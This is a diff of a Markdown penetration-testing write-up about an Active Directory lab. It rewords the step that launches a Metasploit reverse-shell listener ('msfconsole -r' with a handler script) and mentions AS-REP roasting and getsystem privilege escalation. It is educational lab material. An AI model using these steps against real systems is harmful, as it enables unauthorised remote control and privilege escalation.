@@ -183,12 +183,11 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	Doing so, all the account of the organization will be able to see (and execute) that file.
 	
  7. **Run the reverse shell server:**
-	For allowing us to take control of a machine, we need to start the reverse shell server on our Kali machine.
-	For doing so, we execute the following command:
+	For allowing us to take control of a machine, we now start the reverse shell server on Kali through the following command:
 	
 	`msfconsole -r ./Desktop/meterpreter.rc`
 	
-	where `msfconsole` is a CLI through which it is possible to interact with the Metasploit Framework and `meterpreter.rx` is a script, previously created, made up of the following commands:
+	where `msfconsole` is a CLI through which it is possible to interact with the Metasploit Framework and `meterpreter.rc` is a script, previously created, made up of the following commands:
 	
 	```
 	use exploit/multi/handler
@@ -251,11 +250,11 @@ Other useful information about Active Directory have been retrieved from officia
 
 [^2]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE0MDkxMzMwMTQsOTc3OTEyNTE2LDQ5Mj
-Y2NjQxNywtMTE5NTMwMjgzOCw2NDAwODkyOTksLTE3NDAxODc5
-NDEsLTEzNTE2OTYxMTgsNDg0MjU5MzAsLTE2NDc2ODc1OTIsMT
-A5OTkzMTc0MCwtMTI1MjU2MDcxNywxNDkyMjg2NjgzLDI4MDg0
-NDkwNSwtODA0Njk4ODc1LC0xODg4NzA5NTg0LDEzNDI2MzIzNz
-ksLTExMjcxMDk1NTUsLTIwMTU2NDM5NjAsMjA0MTM1ODI0NCwt
-ODkwODI5MjYyXX0=
+eyJoaXN0b3J5IjpbNDY1MjAyNTAxLDk3NzkxMjUxNiw0OTI2Nj
+Y0MTcsLTExOTUzMDI4MzgsNjQwMDg5Mjk5LC0xNzQwMTg3OTQx
+LC0xMzUxNjk2MTE4LDQ4NDI1OTMwLC0xNjQ3Njg3NTkyLDEwOT
+k5MzE3NDAsLTEyNTI1NjA3MTcsMTQ5MjI4NjY4MywyODA4NDQ5
+MDUsLTgwNDY5ODg3NSwtMTg4ODcwOTU4NCwxMzQyNjMyMzc5LC
+0xMTI3MTA5NTU1LC0yMDE1NjQzOTYwLDIwNDEzNTgyNDQsLTg5
+MDgyOTI2Ml19
 -->
